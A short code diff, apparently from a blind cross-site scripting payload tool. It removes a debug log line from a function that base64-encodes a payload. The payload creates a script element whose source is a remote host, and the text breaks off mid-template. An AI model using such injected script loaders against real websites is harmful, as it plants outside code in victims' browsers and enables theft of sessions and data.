@@ -177,7 +177,6 @@ exports.payloadList = config => {
 };
 
 exports.encodePayload = (config, id) => {
-  console.log(id);
   const btoa = require('btoa');
   return btoa(
     `d=document; _ = d.createElement('script');_.id='${id}';_.src='//${
